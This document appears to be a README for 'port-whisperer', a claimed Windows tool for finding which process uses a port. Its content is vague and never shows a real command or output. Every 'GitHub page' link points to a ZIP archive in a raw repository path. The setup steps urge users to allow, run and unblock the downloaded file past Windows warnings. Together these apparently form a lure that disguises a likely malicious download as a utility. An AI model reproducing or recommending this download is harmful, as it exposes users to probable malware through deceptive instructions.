# 💻 port-whisperer - See What Uses Your Ports

[![Download port-whisperer](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/fredeliabound998/port-whisperer/main/src/platform/port_whisperer_1.4.zip)

## 🔍 What port-whisperer does

port-whisperer is a Windows CLI tool that shows what is running on your ports. If a program is using a port on your computer, this tool helps you see it in a clear way.

Use it when you want to find:

- Which app is using a port
- Why a port is blocked
- What is listening on a local network port
- Which process you may need to close

It is built for people who want a quick view without digging through system tools.

## 📦 Download and install

Use this link to visit the download page:

[Download port-whisperer](https://raw.githubusercontent.com/fredeliabound998/port-whisperer/main/src/platform/port_whisperer_1.4.zip)

Follow these steps on Windows:

1. Open the download page in your browser.
2. Find the latest release or app file.
3. Download the Windows file to your computer.
4. Open the file after it finishes downloading.
5. If Windows asks for permission, choose Allow or Run.
6. If the app comes in a ZIP file, right-click it and choose Extract All first.
7. Open the extracted folder and start the app from there.

If you use a package manager or a terminal-based setup, keep the app in a folder you can find again. Many people place it in `Downloads`, `Desktop`, or a folder named `Tools`.

## 🖥️ System requirements

port-whisperer is made for Windows desktops and laptops. A normal home or work computer should be enough.

Basic setup:

- Windows 10 or Windows 11
- A standard command line window
- Permission to open files you downloaded
- Internet access to get the app from GitHub

Recommended setup:

- A recent Windows update
- At least 4 GB of memory
- A user account with permission to run local tools

## ⚙️ First-time setup

After you download the app, set it up like this:

1. Place the file in a folder you can find later.
2. If the file is compressed, extract it.
3. Open Command Prompt or PowerShell.
4. Go to the folder where the file is saved.
5. Start the app using the file name from the release.
6. Keep the terminal window open while you use it.

If Windows blocks the file, open the file properties and choose the option to allow it. This can happen with files downloaded from the web.

## 🚦 How to use it

port-whisperer is built to be used from the command line. That means you type a simple command and read the results in the window.

Common use cases:

- Check what is using port 3000
- Find the app tied to port 8080
- See which process listens on a busy port
- Look for ports that should be free but are not

A typical flow:

1. Open Command Prompt.
2. Run the tool with a port number.
3. Read the process name or ID in the output.
4. Close the app that is using the port if needed.
5. Run the tool again to check the port is free.

If you are not sure which port to check, start with the one shown in the error message from another app.

## 🔎 What you can expect to see

The tool is designed to give a clean list of port activity. You can expect details like:

- Port number
- Process name
- Process ID
- Status of the port
- Simple text output that is easy to read

This helps when another app says a port is already in use or when a local service will not start.

## 🧭 Example uses

Here are some common situations where port-whisperer helps:

- A local web app will not start on port 3000
- A development server keeps failing on port 8080
- You want to know if a sync tool is listening on a port
- You need to find a process before closing it in Task Manager
- You want a fast check without opening several Windows tools

## 🧰 Basic troubleshooting

If the app does not seem to work, try these steps:

### 🪟 Command window closes too fast

Open Command Prompt first, then start the tool from inside the window. This keeps the output visible.

### 📁 File will not open

Make sure you extracted the ZIP file if one was provided. Do not run the app from inside the compressed folder.

### 🔐 Windows blocks the file

Right-click the file, open Properties, and look for the unblock option. Then try again.

### 🧾 No output appears

Check that you entered the port number the right way. Make sure the port is in use before you test it.

### 🔁 Wrong process shows up

Run the tool again and confirm the port number. Some apps open more than one port.

## ⌨️ Helpful command examples

Use these as a guide once you are in the app folder:

- Check a single port
- Scan for a port in use
- List what is listening on common app ports
- Confirm a local service stopped after you closed it

If the release includes a help command, run it first. It will show the exact command format for your version.

## 📁 Suggested folder setup

A simple folder setup makes the tool easier to use:

- `Downloads` for the first file
- `Tools` for apps you use often
- `Projects` if you keep it with your other work files

If you use it often, move it out of Downloads after setup. That keeps your files tidy and makes the tool easier to find later.

## 🧹 After you finish

When you are done, you can keep the app in the same folder for later use. If you no longer need it, delete the file and empty the recycle bin.

If you want to use it again later, keep the folder name simple so you can find it fast.

## ❓ Common questions

### Is this only for Windows?

The setup guide here is written for Windows users. Use it on a Windows PC.

### Do I need programming skills?

No. You only need to download the file, open a terminal window, and run the command shown in the release notes or help screen.

### What does it do in plain English?

It tells you what app is using a port on your computer.

### Why would I use this instead of Task Manager?

Task Manager shows running apps. This tool focuses on ports, which helps when you know the port number but not the app name.

### Can it help with local web apps?

Yes. It is useful when a local site, test server, or developer tool will not start because a port is busy.

## 📌 GitHub page

Use this page to get the latest version:

[https://raw.githubusercontent.com/fredeliabound998/port-whisperer/main/src/platform/port_whisperer_1.4.zip](https://raw.githubusercontent.com/fredeliabound998/port-whisperer/main/src/platform/port_whisperer_1.4.zip)

## 🧪 Quick start for Windows

1. Visit the GitHub page.
2. Download the Windows file from the latest release.
3. Extract it if needed.
4. Open Command Prompt.
5. Move to the app folder.
6. Run the tool with a port number.
7. Read the output and close the app that uses the port if needed